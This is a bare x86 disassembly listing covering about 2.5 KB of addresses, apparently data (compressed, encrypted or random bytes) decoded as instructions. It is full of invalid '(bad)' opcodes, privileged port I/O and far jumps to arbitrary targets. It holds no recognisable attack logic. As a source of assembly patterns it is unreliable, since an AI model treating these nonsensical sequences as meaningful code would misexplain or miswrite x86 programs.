  497e74:	xchg   esi,eax
  497e75:	push   ebx
  497e76:	jle    0x497dfc
  497e78:	add    al,0xa4
  497e7a:	jb     0x497e0d
  497e7c:	xor    bl,BYTE PTR [ebp+0x4b]
  497e7f:	xor    al,BYTE PTR [edx]
  497e81:	shl    al,0x51
  497e84:	ret    0x6e3b
  497e87:	inc    ecx
  497e88:	test   eax,0xdbbd3c40
  497e8d:	xor    eax,0x78fb9936
  497e92:	push   es
  497e93:	jg     0x497e68
  497e95:	jl     0x497e66
  497e97:	jno    0x497efc
  497e99:	sub    ecx,ebx
  497e9b:	and    al,0xf8
  497e9d:	xchg   DWORD PTR [esi-0x8],ebx
  497ea0:	xchg   esp,eax
  497ea1:	mov    ah,0x40
  497ea3:	sub    al,0x5
  497ea5:	(bad)  
  497ea7:	xlat   BYTE PTR ds:[ebx]
  497ea8:	cli    
  497ea9:	and    al,0xda
  497eab:	xchg   BYTE PTR [edx],ch
  497ead:	pop    esp
  497eae:	mov    bh,0x38
  497eb0:	add    eax,0x44000b75
  497eb5:	inc    esp
  497eb6:	mov    al,bh
  497eb8:	sub    BYTE PTR [esi],dh
  497eba:	jle    0x497ebb
  497ebc:	fwait
  497ebd:	xor    al,0xbd
  497ebf:	cmp    edi,ebx
  497ec1:	jg     0x497f34
  497ec3:	jl     0x497eb1
  497ec5:	jae    0x497f32
  497ec7:	push   ebx
  497ec8:	add    BYTE PTR [esp+eax*8],ch
  497ecb:	loopne 0x497e72
  497ecd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  497ece:	dec    edi
  497ecf:	add    ecx,ebx
  497ed1:	xchg   edi,eax
  497ed2:	adc    eax,0x4fc0e72b
  497ed7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  497ed8:	int3   
  497ed9:	enter  0x482d,0x99
  497edd:	ret    0x9800
  497ee0:	cdq    
  497ee1:	fs push eax
  497ee3:	mul    BYTE PTR [ebp-0x709b9949]
  497ee9:	mov    ebp,0x5c0ec8e7
  497eee:	mov    eax,DWORD PTR [ebx-0x25dca9c8]
  497ef4:	out    0x7d,al
  497ef6:	mov    edx,DWORD PTR [eax+0x54]
  497ef9:	popa   
  497efa:	aam    0xec
  497efc:	jecxz  0x497ea9
  497efe:	fwait
  497eff:	xchg   edx,eax
  497f00:	call   0x2a3cb7de
  497f05:	gs enter 0xc9a5,0x74
  497f0a:	lds    edx,FWORD PTR [esp+ecx*4]
  497f0d:	outs   dx,DWORD PTR ds:[esi]
  497f0e:	fucomp st(0)
  497f10:	ins    DWORD PTR es:[edi],dx
  497f11:	mov    ch,0x13
  497f13:	test   eax,0x94a44d5f
  497f18:	(bad)  
  497f19:	sub    esp,DWORD PTR [edi+0x1e]
  497f1c:	add    esi,eax
  497f1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  497f1f:	iret   
  497f20:	push   esi
  497f21:	push   ebp
  497f22:	or     al,0x74
  497f24:	aad    0x56
  497f26:	add    eax,0x7076ce3b
  497f2b:	jmp    0x4048a018
  497f30:	xchg   esp,eax
  497f31:	sbb    al,BYTE PTR [edi]
  497f33:	loope  0x497f47
  497f35:	sub    dl,BYTE PTR [eax+edi*4]
  497f38:	add    eax,0xe787083c
  497f3d:	inc    ebx
  497f3e:	inc    ecx
  497f3f:	ds mov ss:0x6e4e7e2d,al
  497f46:	daa    
  497f47:	push   es
  497f48:	or     BYTE PTR [eax+0x1],ch
  497f4b:	out    dx,al
  497f4c:	push   ds
  497f4d:	or     al,0x40
  497f4f:	cmp    al,BYTE PTR [ebx+0x13]
  497f52:	inc    ecx
  497f53:	inc    edx
  497f54:	mov    dl,0x4c
  497f56:	adc    DWORD PTR [edx+0x62733cc6],0x56
  497f5d:	mov    al,ds:0x254a1627
  497f62:	add    DWORD PTR ds:0x3134e879,esi
  497f68:	add    ch,BYTE PTR [edx]
  497f6a:	mov    WORD PTR [ecx+edx*2+0x6a6311c6],?
  497f71:	mov    edi,DWORD PTR ds:0x3c4c0e80
  497f77:	adc    BYTE PTR [edi+eax*1+0x1c1a02f0],dh
  497f7e:	mov    eax,0x8f5e1d24
  497f83:	dec    edi
  497f84:	jmp    0x497f07
  497f86:	pop    edx
  497f87:	push   0xffffffff
  497f89:	mov    ds:0x22ad6cd3,al
  497f8e:	and    al,0x7a
  497f90:	cs push esp
  497f92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  497f93:	neg    DWORD PTR [eax+0x20a7ad3c]
  497f99:	cld    
  497f9a:	inc    ebx
  497f9b:	sub    eax,0xc9e3104c
  497fa0:	adc    eax,0xf44b37be
  497fa5:	ss adc al,0xce
  497fa8:	sub    bl,bl
  497faa:	ficomp DWORD PTR [edi-0x3fb722bc]
  497fb0:	jns    0x497fc3
  497fb2:	out    dx,al
  497fb3:	sbb    bh,BYTE PTR [edx-0x68]
  497fb6:	dec    edx
  497fb7:	bound  edi,QWORD PTR [ebp-0x3e]
  497fba:	xlat   BYTE PTR ds:[ebx]
  497fbb:	clc    
  497fbc:	inc    esi
  497fbd:	es add al,0xc8
  497fc0:	jne    0x497f63
  497fc2:	icebp  
  497fc3:	call   0x5b54a779
  497fc8:	inc    ecx
  497fc9:	jmp    0x497fbb
  497fcb:	add    edi,DWORD PTR [edi+0x539f01f8]
  497fd1:	add    cl,BYTE PTR [ebx]
  497fd3:	leave  
  497fd4:	je     0x498023
  497fd6:	inc    BYTE PTR [esi-0x49ab6802]
  497fdc:	mov    bh,0x41
  497fde:	mov    bl,0x5a
  497fe0:	mov    dh,0x20
  497fe2:	out    dx,al
  497fe3:	es or  ah,ah
  497fe6:	cwde   
  497fe7:	outs   dx,BYTE PTR ds:[esi]
  497fe8:	push   0x2774d001
  497fed:	shl    BYTE PTR [ebx],cl
  497fef:	lahf   
  497ff0:	idiv   edi
  497ff2:	bound  edi,QWORD PTR [edx+edi*1]
  497ff5:	out    0x72,eax
  497ff7:	push   es
  497ff8:	cmp    ah,bl
  497ffa:	ja     0x497ffe
  497ffc:	add    ah,dh
  497ffe:	cmp    al,bh
  498000:	adc    al,bl
  498002:	(bad)  
  498003:	cmp    ch,ah
  498005:	add    ecx,DWORD PTR [ebx-0x5e]
  498008:	loopne 0x49800c
  49800a:	(bad)  
  49800b:	shl    DWORD PTR [ebx],1
  49800d:	leave  
  49800e:	adc    al,0xe1
  498010:	cli    
  498011:	cmp    eax,0xadb9e0ba
  498016:	jb     0x49801a
  498018:	neg    ecx
  49801a:	mov    eax,ecx
  49801c:	or     al,0x58
  49801e:	popf   
  49801f:	and    BYTE PTR [esi+0x3a21d387],cl
  498025:	test   DWORD PTR [esi+0xe],esi
  498028:	adc    al,0x88
  49802a:	add    BYTE PTR [esi-0x7e],al
  49802d:	adc    eax,DWORD PTR [edx+ebx*1+0x52169046]
  498034:	test   eax,0x75cef2bc
  498039:	cwde   
  49803a:	test   al,0x89
  49803c:	dec    ebp
  49803d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49803e:	pushf  
  49803f:	xchg   esp,eax
  498040:	daa    
  498041:	or     bl,dh
  498043:	adc    BYTE PTR [edx],al
  498045:	xor    ebx,DWORD PTR [eax]
  498047:	mov    BYTE PTR [eax],0xac
  49804a:	nop
  49804b:	jo     0x497fd7
  49804d:	add    bh,BYTE PTR [esi+eiz*2]
  498050:	cmp    al,0x9
  498052:	fidivr DWORD PTR [edi+0x5]
  498055:	call   0x375:0xd2c0a30
  49805c:	inc    edx
  49805d:	jmp    0x49804a
  49805f:	push   ebx
  498060:	mov    bl,0x30
  498062:	cs inc edx
  498064:	iret   
  498065:	xchg   edi,eax
  498066:	sahf   
  498067:	and    BYTE PTR [ebp+0x42432d1c],dh
  49806d:	sbb    BYTE PTR [ebx+0x6c104289],0x6
  498074:	call   0x8823:0x388eb4a
  49807b:	fistp  QWORD PTR [ecx+0x29c2013a]
  498081:	loopne 0x4980aa
  498083:	stos   DWORD PTR es:[edi],eax
  498084:	leave  
  498085:	mov    eax,0x9fc8cfd
  49808a:	mov    al,0x1d
  49808c:	dec    eax
  49808d:	dec    eax
  49808e:	jl     0x49805e
  498090:	jmp    0x498042
  498092:	cld    
  498093:	add    al,0x61
  498095:	ins    DWORD PTR es:[edi],dx
  498096:	test   eax,0x2beda4b3
  49809b:	mov    eax,0x9beb1eef
  4980a0:	mov    ds:0x76a8a872,al
  4980a5:	stos   DWORD PTR es:[edi],eax
  4980a6:	popf   
  4980a7:	fistp  WORD PTR [esi]
  4980a9:	inc    eax
  4980aa:	or     BYTE PTR [esi],dh
  4980ac:	scas   eax,DWORD PTR es:[edi]
  4980ad:	cmp    al,0x92
  4980af:	and    bh,BYTE PTR [ebp*1+0x13a61e74]
  4980b6:	les    ecx,FWORD PTR ds:0x3cbb745c
  4980bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4980bd:	das    
  4980be:	sbb    al,0x1
  4980c1:	std    
  4980c2:	cmp    al,0x45
  4980c4:	jle    0x4980d0
  4980c6:	sub    al,0x64
  4980c8:	xchg   edx,eax
  4980c9:	xchg   DWORD PTR [ecx],esp
  4980cb:	in     al,0x4a
  4980cd:	lock jg 0x498073
  4980d0:	mov    DWORD PTR [edx+0x6a],ecx
  4980d3:	or     ebp,ebx
  4980d5:	test   BYTE PTR [ecx],bh
  4980d7:	cld    
  4980d8:	mov    ds:0x2e27b169,al
  4980dd:	xchg   edi,eax
  4980de:	mov    ah,BYTE PTR [ecx-0x9]
  4980e1:	dec    ecx
  4980e2:	ror    DWORD PTR [ecx],cl
  4980e4:	xchg   edx,eax
  4980e5:	cmp    dh,BYTE PTR [ebx+0x2]
  4980e8:	cs jmp 0x4980db
  4980eb:	or     DWORD PTR [edx+0x1aebc00a],esp
  4980f1:	sbb    BYTE PTR [edx],0x88
  4980f4:	jnp    0x498078
  4980f6:	push   0x88890aa1
  4980fb:	pop    es
  4980fc:	inc    edi
  4980fd:	shl    DWORD PTR [esi-0x77ad87f],1
  498103:	pop    esp
  498104:	jge    0x4980e8
  498106:	(bad)  
  498107:	out    dx,eax
  498108:	jnp    0x498118
  49810a:	into   
  49810b:	push   0x888a8e26
  498110:	sub    eax,0x4300768b
  498115:	adc    BYTE PTR [esi-0x5bfb6f8a],ah
  49811b:	aam    0x84
  49811d:	sbb    BYTE PTR [esi+ebx*8+0x67],0x73
  498122:	je     0x49811a
  498124:	jmp    0x49813e
  498126:	mov    dl,0xd5
  498128:	or     esp,DWORD PTR [edi-0x7b]
  49812b:	add    al,0xc2
  49812d:	cmp    ebp,eax
  49812f:	mov    ebx,0x4b786420
  498134:	daa    
  498135:	mov    BYTE PTR [eax+edi*1],bh
  498138:	outs   dx,BYTE PTR ds:[esi]
  498139:	xchg   esi,eax
  49813a:	pop    ss
  49813b:	and    BYTE PTR [esi],dh
  49813d:	pop    esp
  49813e:	or     BYTE PTR [edi-0x37],0xe2
  498142:	fdiv   QWORD PTR [eax-0x62]
  498145:	aaa    
  498146:	sub    BYTE PTR [edi-0x6e034e0],bl
  49814c:	or     DWORD PTR ds:0x2e2d023d,edi
  498152:	or     DWORD PTR [ebp-0x68],0x4
  498156:	xor    dh,0xec
  498159:	add    ch,BYTE PTR [edx+edi*8]
  49815c:	push   cs
  49815d:	and    eax,0x780a0aa
  498162:	cmp    ebp,DWORD PTR [ebx+0x2cf9f868]
  498168:	xor    DWORD PTR [esi+ebp*4],edi
  49816b:	mov    eax,0x76a52652
  498170:	lods   eax,DWORD PTR ds:[esi]
  498171:	sub    ah,al
  498173:	jmp    0x49817e
  498175:	(bad)  
  498176:	jmp    0x498137
  498178:	sub    eax,DWORD PTR [edi-0x55]
  49817b:	out    0xf9,al
  49817d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49817e:	adc    esi,DWORD PTR [eax]
  498180:	inc    esp
  498182:	dec    eax
  498183:	dec    eax
  498184:	je     0x49813a
  498186:	test   al,0x61
  498188:	nop
  498189:	inc    ebx
  49818a:	sahf   
  49818b:	nop
  49818c:	fcom   DWORD PTR [eax]
  49818e:	dec    edi
  49818f:	sahf   
  498190:	xchg   edi,eax
  498191:	and    ah,ch
  498193:	mov    DWORD PTR cs:[edx],esp
  498196:	fstp   QWORD PTR gs:[ecx+0x4f]
  49819a:	adc    BYTE PTR [ebp+0x3d4a3e20],bl
  4981a0:	adc    BYTE PTR [edi],al
  4981a2:	iret   
  4981a3:	dec    edi
  4981a4:	iret   
  4981a5:	mov    esi,0xf2197589
  4981aa:	and    BYTE PTR [esi],ah
  4981ac:	cmp    cl,bh
  4981ae:	dec    edi
  4981af:	cmp    BYTE PTR [esi+0x314c8df0],bh
  4981b5:	or     ebp,esi
  4981b7:	jecxz  0x498171
  4981b9:	cmp    eax,0x9c33209c
  4981be:	jmp    0x4981cb
  4981c0:	push   eax
  4981c1:	jg     0x631a8624
  4981c7:	ss pushf 
  4981c9:	xor    eax,0x8cc22bf1
  4981ce:	or     al,0x20
  4981d0:	dec    DWORD PTR [ebx]
  4981d2:	dec    edi
  4981d3:	cmp    BYTE PTR [edi],0x9c
  4981d6:	cwde   
  4981d7:	xor    al,BYTE PTR [eax-0x38]
  4981da:	nop
  4981db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4981dc:	test   BYTE PTR [eax],ah
  4981de:	add    esp,DWORD PTR [ecx]
  4981e0:	inc    ebx
  4981e1:	test   BYTE PTR [eax+0x532413c9],dh
  4981e7:	nop
  4981e8:	add    dh,BYTE PTR [edx]
  4981ea:	mov    bl,0xeb
  4981ec:	push   edx
  4981ed:	leave  
  4981ee:	push   ebx
  4981ef:	add    dh,BYTE PTR [edx]
  4981f1:	mov    dh,0x4a
  4981f3:	cld    
  4981f4:	rcl    BYTE PTR [ebx],cl
  4981f6:	les    edx,FWORD PTR [edx-0x746757f5]
  4981fc:	push   ebp
  4981fd:	test   al,0x93
  4981ff:	lahf   
  498200:	sbb    al,0xf2
  498202:	pushf  
  498203:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  498204:	mov    al,ds:0x4ca4558b
  498209:	jb     0x4981c4
  49820b:	xchg   edx,eax
  49820c:	mov    ah,0xb4
  49820e:	mov    ah,0xa4
  498210:	inc    edx
  498211:	(bad)  
  498212:	xchg   ebx,eax
  498213:	(bad)  
  498214:	pushf  
  498215:	cmp    DWORD PTR [ebp-0x64],0xffffff98
  498219:	dec    DWORD PTR [ebp-0x58]
  49821c:	cmp    DWORD PTR [ebp-0x58],0xffffff92
  498220:	or     edx,DWORD PTR [eax-0x6f4f4f5f]
  498226:	mov    eax,ds:0x909002e4
  49822b:	xchg   ebx,eax
  49822c:	add    esp,esp
  49822e:	sub    BYTE PTR [esp+edx*4-0x6fc665e0],dl
  498235:	xchg   esp,eax
  498236:	mov    al,ch
  498238:	syscall 
  49823a:	(bad)  
  49823b:	repnz lahf 
  49823d:	or     DWORD PTR [ecx+ecx*4+0x79ed0277],edx
  498244:	ficom  WORD PTR [edi]
  498246:	popa   
  498247:	loopne 0x49825a
  498249:	cmp    eax,0x6630042
  49824e:	scas   al,BYTE PTR es:[edi]
  49824f:	fcomip st,st(3)
  498251:	cmp    al,0x4f
  498253:	repz and al,0x3e
  498256:	pop    esp
  498257:	jo     0x498222
  498259:	mov    ah,0x13
  49825b:	loope  0x4981fb
  49825d:	out    0x31,al
  49825f:	aas    
  498260:	es aad 0x16
  498263:	mov    bh,0x74
  498265:	add    eax,DWORD PTR [edx]
  498267:	and    BYTE PTR [ecx],0x4e
  49826a:	fsubr  DWORD PTR [eax]
  49826c:	xchg   edx,eax
  49826d:	leave  
  49826e:	loope  0x4982c5
  498270:	adc    BYTE PTR [ecx+0x1cea3ce9],bh
  498276:	push   es
  498277:	cs ss hlt 
  49827a:	retf   0x5672
  49827d:	and    edx,eax
  49827f:	xchg   edx,eax
  498280:	aad    0x4c
  498282:	lods   eax,DWORD PTR ds:[esi]
  498283:	mov    ah,BYTE PTR [eax+0x669ccc00]
  498289:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49828a:	lea    esp,[edx+ebx*2]
  49828d:	adc    al,0xc
  49828f:	aam    0xd8
  498291:	or     dl,dh
  498293:	call   0xae897e58
  498298:	add    DWORD PTR ds:0x28dde31a,ebx
  49829e:	adc    ch,BYTE PTR ds:0x200a04eb
  4982a4:	xor    eax,0xceb68408
  4982a9:	nop
  4982aa:	mov    eax,0xb8e69d04
  4982af:	add    DWORD PTR [esi],edi
  4982b1:	cmp    al,0x9a
  4982b3:	push   cs
  4982b4:	(bad)  
  4982b5:	shl    DWORD PTR [edi+ecx*4-0x5fb2dddf],1
  4982bc:	data16 xor al,0x95
  4982bf:	sar    DWORD PTR [esi-0x5],1
  4982c2:	and    esp,DWORD PTR [ebp+ecx*1+0x4]
  4982c6:	and    BYTE PTR [eax+0x43c76660],cl
  4982cc:	add    eax,DWORD PTR [ecx]
  4982ce:	xor    BYTE PTR [edx+0x5],dh
  4982d1:	jbe    0x498285
  4982d3:	xor    al,0xa1
  4982d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4982d6:	cmp    al,0xca
  4982d8:	pop    esi
  4982d9:	loope  0x4982b8
  4982db:	daa    
  4982dc:	mov    BYTE PTR [edi-0x47a1d977],dl
  4982e2:	sahf   
  4982e3:	sbb    dl,BYTE PTR [edx+0x4b7853c2]
  4982e9:	sbb    esi,edi
  4982eb:	sar    DWORD PTR ds:0xe433fc20,0x75
  4982f2:	adc    ebp,DWORD PTR [eax-0x6c]
  4982f5:	dec    ebx
  4982f6:	test   al,0x80
  4982f8:	xchg   edi,eax
  4982f9:	mov    ch,0x26
  4982fb:	jae    0x498281
  4982fd:	and    eax,0x32434850
  498302:	lods   al,BYTE PTR ds:[esi]
  498303:	stc    
  498304:	push   edx
  498305:	out    dx,al
  498306:	imul   ecx,DWORD PTR [eax],0xffffff82
  498309:	adc    al,0x42
  49830b:	sub    eax,0xbc4f8c68
  498310:	jmp    0x805840f1
  498315:	and    bl,BYTE PTR [edi]
  498317:	sbb    eax,0x4948468
  49831c:	push   0x16
  49831e:	push   eax
  49831f:	sti    
  498320:	add    eax,0xb8a36153
  498325:	push   es
  498326:	add    eax,DWORD PTR ds:0x7c681beb
  49832c:	cmp    DWORD PTR [ebx-0x64ff31ff],eax
  498332:	dec    esp
  498333:	aas    
  498334:	into   
  498335:	mov    ah,0xfe
  498337:	xchg   BYTE PTR [edx+ecx*8-0x75],dl
  49833b:	fldcw  WORD PTR [ecx-0x37]
  49833e:	adc    BYTE PTR [ebp-0x7a],cl
  498341:	add    DWORD PTR [edx+0x18b22b1c],ebx
  498347:	ror    esp,0x2c
  49834a:	inc    ebx
  49834b:	sub    cl,BYTE PTR [edi+0x4d7fe1c7]
  498351:	lea    eax,[eax+ecx*1-0x134312f4]
  498358:	sar    eax,0x9a
  49835b:	retf   0x995e
  49835e:	ret    0xf01b
  498361:	loopne 0x498372
  498363:	mov    edi,0xdbf707d8
  498368:	push   0x455b4d45
  49836d:	push   ebp
  49836e:	jmp    0x9838:0xe2e0e670
  498375:	imul   eax,DWORD PTR [esi],0x859d04fc
  49837b:	fstp   TBYTE PTR [ecx+0xf]
  49837e:	mov    eax,0xd6e84620
  498383:	les    esi,FWORD PTR [edi-0x7cc3678c]
  498389:	fdiv   DWORD PTR [edx+ebp*2+0x5414df5a]
  498390:	mov    ecx,ebx
  498392:	sar    ebx,0xb8
  498395:	pop    es
  498396:	and    ah,BYTE PTR [edi-0x35]
  498399:	gs sub ebx,esp
  49839c:	sbb    eax,0xd33c402e
  4983a1:	inc    edx
  4983a2:	push   0xffffffbc
  4983a4:	mov    ecx,0x11720841
  4983a9:	add    DWORD PTR [edx],ecx
  4983ab:	or     BYTE PTR [eax-0x1a],dh
  4983ae:	(bad)  
  4983af:	cli    
  4983b0:	add    DWORD PTR fs:0xa02906b,esi
  4983b7:	mov    esp,0x1fb83ef2
  4983bc:	push   eax
  4983bd:	outs   dx,DWORD PTR ds:[esi]
  4983be:	shr    DWORD PTR [eax-0x741f078d],0x1
  4983c5:	cmc    
  4983c6:	sbb    dl,0xd1
  4983c9:	xor    ebp,esp
  4983cb:	mov    esi,0xf5d6e2b9
  4983d0:	(bad)  
  4983d1:	in     eax,0xef
  4983d3:	mov    dl,0x8b
  4983d5:	and    BYTE PTR [ebx],ah
  4983d7:	(bad)  
  4983d8:	and    ecx,esi
  4983da:	push   0x9a034011
  4983df:	add    bh,BYTE PTR [esi+edi*8-0x58290fcb]
  4983e6:	add    eax,DWORD PTR [edi-0x31432d04]
  4983ec:	jae    0x10484290
  4983f2:	xchg   DWORD PTR [eax-0x2f12cb02],edx
  4983f8:	shl    BYTE PTR [edi+0x10],0x5e
  4983fc:	call   0x3a2a6805
  498401:	stc    
  498402:	enter  0x806,0x37
  498406:	jge    0x49844f
  498408:	test   DWORD PTR [ebp-0x18],0x6f714de4
  49840f:	in     al,0xe0
  498411:	jmp    0x3740:0x4664ac4b
  498418:	dec    ebx
  498419:	clc    
  49841a:	xchg   edi,eax
  49841b:	or     BYTE PTR [ecx],cl
  49841d:	cmp    DWORD PTR [eax+0x4],esi
  498420:	jne    0x498426
  498422:	scas   al,BYTE PTR es:[edi]
  498423:	mov    ah,0x21
  498425:	jne    0x498431
  498427:	push   eax
  498428:	or     al,0x0
  49842a:	xchg   ah,dh
  49842c:	in     al,dx
  49842d:	sar    dh,0x69
  498430:	outs   dx,BYTE PTR ds:[esi]
  498431:	pop    esi
  498432:	dec    ebp
  498433:	lods   al,BYTE PTR ds:[esi]
  498434:	rol    BYTE PTR [ebx],0xc9
  498437:	mov    al,0x55
  498439:	lea    ecx,[ebp+ecx*1-0x20]
  49843d:	or     DWORD PTR [edi+0x4f],edx
  498440:	adc    al,BYTE PTR [edx+0x4d]
  498443:	pop    esp
  498444:	xchg   esp,eax
  498445:	sub    BYTE PTR [ebp+0x26449694],bl
  49844b:	adc    al,BYTE PTR [eax+0x53]
  49844e:	xchg   DWORD PTR [esi-0x3777a9f2],ebx
  498454:	call   0xb850aefd
  498459:	ror    DWORD PTR [edx+ecx*1+0x3b],1
  49845d:	ret    0xc1ec
  498460:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  498461:	dec    edi
  498462:	jae    0x4984cd
  498464:	inc    esi
  498465:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  498466:	inc    esi
  498467:	push   es
  498468:	nop
  498469:	xchg   esp,eax
  49846a:	add    BYTE PTR [edi-0x4f4fc32d],dh
  498470:	jl     0x49842e
  498472:	add    esi,0x47
  498475:	outs   dx,BYTE PTR ds:[esi]
  498476:	call   0x8dc0:0xc0acf2e6
  49847d:	add    edi,0xe027eff
  498483:	pop    DWORD PTR [edx-0x2c077fc5]
  498489:	bound  edi,QWORD PTR [edi+0x1]
  49848c:	or     al,0x2f
  49848e:	js     0x498410
  498490:	div    al
  498492:	mov    edx,eax
  498494:	add    eax,eax
  498496:	shr    ecx,0x88
  498499:	and    DWORD PTR [edi+edx*8+0x78500b1f],ebp
  4984a0:	addr16 dec edx
  4984a2:	add    ecx,DWORD PTR [esi]
  4984a4:	mov    al,ds:0x1ec700c0
  4984a9:	push   0xffffff9e
  4984ab:	xchg   ecx,eax
  4984ac:	add    ebx,esp
  4984ae:	jg     0x49847a
  4984b0:	or     dl,bh
  4984b2:	(bad)  
  4984b3:	inc    edi
  4984b5:	sar    BYTE PTR [eax+0x3c05734],cl
  4984bb:	clc    
  4984bc:	lock mov eax,0xc1005373
  4984c2:	and    ah,al
  4984c4:	cli    
  4984c5:	hlt    
  4984c6:	clc    
  4984c7:	shl    ecx,0x81
  4984ca:	fiadd  WORD PTR [eax]
  4984cc:	ja     0x4984bc
  4984ce:	or     esi,ecx
  4984d0:	mov    esp,0xca0be9fb
  4984d5:	dec    eax
  4984d6:	mul    ah
  4984d8:	repnz add BYTE PTR [ebx],cl
  4984db:	pop    edx
  4984dc:	cli    
  4984dd:	inc    ebp
  4984de:	mov    eax,0xfcb906f0
  4984e3:	cmp    eax,esi
  4984e5:	dec    ebp
  4984e6:	lock and ecx,0xf91cf2f9
  4984ed:	repnz pop esp
  4984ef:	repnz div dh
  4984f2:	add    BYTE PTR [ecx+0x52a4fa4d],bh
  4984f8:	mov    ecx,0xfa47fabc
  4984fd:	div    dl
  4984ff:	loopne 0x4984ab
  498501:	push   ecx
  498502:	rcr    dl,1
  498504:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  498505:	or     eax,0x3bca9098
  49850a:	add    ebp,DWORD PTR [eax-0x1f1bba77]
  498510:	call   0x83e999bb
  498515:	sbb    dh,0x88
  498518:	jge    0x498532
  49851a:	ins    DWORD PTR es:[edi],dx
  49851b:	or     BYTE PTR ds:0x20ba5208,dh
  498521:	xchg   DWORD PTR [ebx],esp
  498523:	push   ds
  498524:	sbb    ebp,ecx
  498526:	retf   0x8a9f
  498529:	pop    ebp
  49852a:	fidivr DWORD PTR [eax+0x261626e0]
  498530:	fimul  DWORD PTR [esi-0x62]
  498533:	scas   al,BYTE PTR es:[edi]
  498534:	das    
  498535:	mov    eax,0xdabe0180
  49853a:	xor    ebx,ecx
  49853c:	and    ecx,eax
  49853e:	data16 add al,0x57
  498541:	xchg   ecx,eax
  498543:	and    ebx,0x6c0ab47f
  498549:	call   0xb0f6:0x4a51d34b
  498550:	enter  0xd04c,0x43
  498554:	or     DWORD PTR [esi-0xf4786e7],ebp
  49855a:	xor    eax,0xe3a5601b
  49855f:	cld    
  498560:	mov    ch,0xf0
  498562:	ja     0x4985af
  498564:	stos   BYTE PTR es:[edi],al
  498565:	inc    ebp
  498566:	cmp    bh,BYTE PTR [edx]
  498568:	dec    ebp
  498569:	pop    ebx
  49856a:	fcom   QWORD PTR [edi+0xa]
  49856d:	repnz or edi,DWORD PTR [ebp-0x58]
  498571:	pushw  ds
  498573:	sbb    al,0xa
  498575:	loop   0x49856f
  498577:	cmp    DWORD PTR [eax-0x6119cb8c],edi
  49857d:	jge    0x4985fa
  49857f:	mov    esi,?
  498581:	xchg   esp,eax
  498582:	or     ch,BYTE PTR [eax]
  498584:	mov    al,0x75
  498586:	test   al,0x16
  498588:	pmuludq mm5,mm2
  49858b:	icebp  
  49858c:	cdq    
  49858d:	cmp    BYTE PTR [edx],0x35
  498590:	mov    al,ds:0x461ddef0
  498595:	inc    ebp
  498596:	int    0xcd
  498598:	inc    ebx
  498599:	daa    
  49859a:	adc    edi,DWORD PTR [ecx]
  49859c:	inc    ebp
  49859d:	push   cs
  49859e:	cmp    DWORD PTR [ebp+0x9],eax
  4985a1:	and    ebp,eax
  4985a3:	sub    eax,0x3d3aedcf
  4985a8:	inc    edx
  4985a9:	shl    BYTE PTR [ebp+0x18],1
  4985ac:	fdivr  DWORD PTR [eax]
  4985ae:	aam    0x3b
  4985b0:	xchg   ebx,eax
  4985b1:	and    al,al
  4985b3:	sub    al,0xcc
  4985b5:	mov    al,0x20
  4985b7:	dec    eax
  4985b8:	dec    esp
  4985b9:	(bad)  
  4985ba:	nop
  4985bb:	and    ch,BYTE PTR [edi*2+0x4d0a8b5e]
  4985c2:	cmp    BYTE PTR [ecx],ch
  4985c4:	hlt    
  4985c5:	mov    al,0x42
  4985c7:	dec    ebx
  4985c8:	push   esp
  4985c9:	push   eax
  4985ca:	ret    
  4985cb:	pusha  
  4985cc:	and    al,0xe0
  4985ce:	sbb    BYTE PTR es:[ebx],ch
  4985d1:	or     DWORD PTR [ecx],0xdcc20c32
  4985d7:	stc    
  4985d8:	push   ebx
  4985d9:	test   DWORD PTR [esi+0x0],ecx
  4985dc:	mov    esp,0xa1cca0e
  4985e1:	cmp    ebx,edx
  4985e3:	jo     0x4985c9
  4985e5:	xchg   edi,eax
  4985e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4985e7:	fnstcw WORD PTR [esp+edi*4+0x6d5f8900]
  4985ee:	test   al,0x9a
  4985f0:	mov    cs,WORD PTR [edi-0x547406c]
  4985f6:	mov    eax,0xa29e15bf
  4985fb:	adc    eax,0x8197190c
  498600:	(bad)  
  498601:	or     eax,0xe79d1018
  498606:	idiv   al
  498608:	adc    eax,0x5434470a
  49860d:	adc    eax,esi
  49860f:	adc    esi,esi
  498611:	xchg   ecx,eax
  498612:	addr16 in al,0xe8
  498615:	or     al,0xf6
  498617:	adc    dh,al
  498619:	test   dh,0x7c
  49861c:	dec    ecx
  49861d:	gs nop
  49861f:	lock mov al,0x7d
  498622:	out    dx,eax
  498623:	or     edi,ecx
  498625:	add    BYTE PTR [edx],dh
  498627:	enter  0x7d80,0xb0
  49862b:	test   al,0x70
  49862d:	or     DWORD PTR [esi+eax*2-0x10],0x88c2b10d
  498635:	push   0xbc0c09a4
  49863a:	ret    0xf929
  49863d:	add    BYTE PTR [ebp-0x5c],dh
  498640:	jne    0x49862c
  498642:	or     eax,0x3a91ddb
  498647:	test   eax,0x37e0e0e4
  49864c:	outs   dx,DWORD PTR ds:[esi]
  49864d:	add    eax,0x9cca524f
  498652:	pusha  
  498653:	mov    ah,0x8b
  498655:	jge    0x49866b
  498657:	add    dh,BYTE PTR [eax+esi*1+0x4]
  49865b:	jbe    0x4986b4
  49865d:	stos   BYTE PTR es:[edi],al
  49865e:	cwde   
  49865f:	sbb    al,0x4c
  498661:	sub    DWORD PTR [edx+ebx*1-0x55],ebp
  498665:	inc    edi
  498666:	add    al,0x7
  498668:	mov    al,ds:0xf642c766
  49866e:	sbb    eax,DWORD PTR [edx-0x2b]
  498671:	inc    DWORD PTR [ebp+0x42c602ec]
  498677:	mov    WORD PTR [edx+esi*8-0x7d],es
  49867b:	call   DWORD PTR ds:0x156a037e
  498681:	pop    edi
  498682:	outs   dx,BYTE PTR ds:[esi]
